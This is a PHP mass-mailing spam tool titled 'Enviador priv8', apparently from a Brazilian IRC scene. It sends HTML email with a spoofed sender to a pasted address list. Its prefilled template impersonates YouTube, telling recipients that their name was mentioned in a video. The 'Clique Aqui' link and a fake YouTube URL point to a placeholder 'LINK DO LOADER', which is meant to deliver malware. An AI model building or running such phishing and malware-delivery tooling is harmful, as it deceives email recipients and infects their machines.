<?php

set_time_limit(0);

if($manda)
{
//EMAIL DO DESTINAT?RIO
$destinatario = "$remetente";

//ASSUNTO DO EMAIL
$assunto = "$assunto";

//MENSAGEM DO EMAIL
$mensagem = $html;
$mensagem = stripslashes($mensagem);
//CABE?ALHO DO EMAIL
$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
/* headers adicionais */
$headers .= "From: <$remetente>\r\n";
$headers .= "Cc: $remetente\r\n";
$headers .= "Bcc: e$remetente\r\n";

//ARQUIVO COM OS EMAILS
$arquivo = $lista;

//LENDO ARQUIVO
$file = explode("\n", $arquivo);
$i = 1;


?><title>Mala Direta - PHPSource Script by logic@fullnetwork - support: #LinuxOld BRASnet</title>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<p> </p>
<?
if($manda) { ?>
<table width="59%" height="30" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#333333">
  <tr>
    <td bgcolor="#f5f5f5"> 
      <?
	foreach ($file as $mail) {

				if(mail($mail, $assunto, $mensagem, $headers))

					echo "<font color=green face=verdana size=1>* $i - ".$mail."</font> <font color=green face=verdana size=1>OK</font><br>";

				else

					echo "* $i  ".$email[$i]." <font color=red>NO</font><br><hr>";

$i++;
	 

}
}
?>
    </td>
  </tr>
</table><? } ?>
<form name="form1" method="post" action="">
  <table width="47%" height="202" border="0" align="center" cellpadding="0" cellspacing="2" bgcolor="#666666">
    <tr> 
      <td bgcolor="#FFFFFF"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr> 
            <td colspan="3" bgcolor="#666666"> <div align="center"><font color="#FFFFFF" size="4" face="Verdana, Arial, Helvetica, sans-serif"><b> Enviador priv8 by logic@fullnetwork
                </b></font></div></td>
          </tr>
          <tr> 
            <td width="21%"><div align="center"><font color="#4A0000"><b><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Assunto:</font></b></font></div></td>
            <td width="1%" bgcolor="#666666"> </td>
            <td width="78%"><input name="assunto" type="text" id="assunto3" value="SEU NOME FOI MENCIONADO NA REDE YOUTUBE" size="50"></td>
          </tr>
          <tr> 
            <td><div align="center"><font color="#4A0000"><b><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Remetente:</font></b></font></div></td>
            <td bgcolor="#666666"> </td>
            <td><input name="remetente" type="text" id="remetente3" value="jfshfhjfdj@mail.com"></td>
          </tr>
          <tr> 
            <td><div align="center"><font color="#4A0000"><b><font size="2" face="Verdana, Arial, Helvetica, sans-serif">MSG:</font></b></font></div></td>
            <td bgcolor="#666666"> </td>
            <td><textarea name="html" cols="30" rows="4" id="textarea2">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
  <title>YouTube - Videos</title>
</head>
<body>
<img style="width: 123px; height: 63px;" alt="1" title="1" src="LINK DA IMAGEM "><br>
<br>
Temos a satisfa��o de comunica-lo que seu nome foi mencionado em algum<br>
de nossos videos mais acessados de nossa rede. <span style=""></span><br>
<div style="text-align: center;"><br>
<div style="text-align: left;"><span style="text-decoration: underline;"></span> <span style="color: rgb(51, 51, 255);"><a href="LINK LOADER"><center>Clique Aqui</center></a><br>
<br>
</span>
<div style="text-align: center;"><span class="EC_style3"><span class="EC_style4">(</span> 
</span><a href="LINK DO LOADER">http://www.youtube.com/watch?v=Y6BS8926mVgI</a><span class="EC_style3"> <span class="EC_style4">)</span></span><br></div>
</div>
<br>
<div style="text-align: left;"><span style=""><font face="Arial"><small>Atenciosamente,</small><br>
<br>
<small></small></font></span><small>Equipe YouTube</small> <br>
<br>
<small><span style="color: rgb(204, 204, 204);"><span style="color: rgb(102, 102, 102);">2007 YouTube, LLC -</span></span> <a style="color: rgb(51, 51, 255);" href="#">Give Feedback</a></small><br>
<small>/<span style="color: rgb(102, 102, 102);">DTD HTML 4.01 Transitional//EN"</span></small><br>
<span style=""><font face="Arial"><br>
<br>
</font></span><br>
<span style=""><font face="Arial"><br>
</font></span><span class="EC_style3"><span class="EC_style4"></span><span class="EC_style4"></span></span></div>
</div>
</body>
</html>		


</textarea></td>
          </tr>
          <tr> 
            <td><div align="center"><font color="#4A0000"><b><font size="2" face="Verdana, Arial, Helvetica, sans-serif">E-MAILS:</font></b></font></div></td>
            <td bgcolor="#666666"> </td>
            <td><textarea name="lista" cols="40" rows="10" id="textarea3">testador_inbox@hotmail.com</textarea></td>
          </tr>
          <tr> 
            <td><div align="center"></div></td>
            <td bgcolor="#666666"> </td>
            <td> </td>
          </tr>
          <tr> 
            <td> </td>
            <td bgcolor="#666666"> </td>
            <td><div align="center"> 
                <input name="manda" type="submit" id="manda" value="Yeah!">
              </div></td>
          </tr>
          <tr> 
            <td height="23"> </td>
            <td bgcolor="#666666"> </td>
            <td><div align="center"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Informa��es: 
                <b>irc.brasnet.org - #LinuxOld </b></font></div></td>
          </tr>
        </table></td>
    </tr>
  </table>
</form>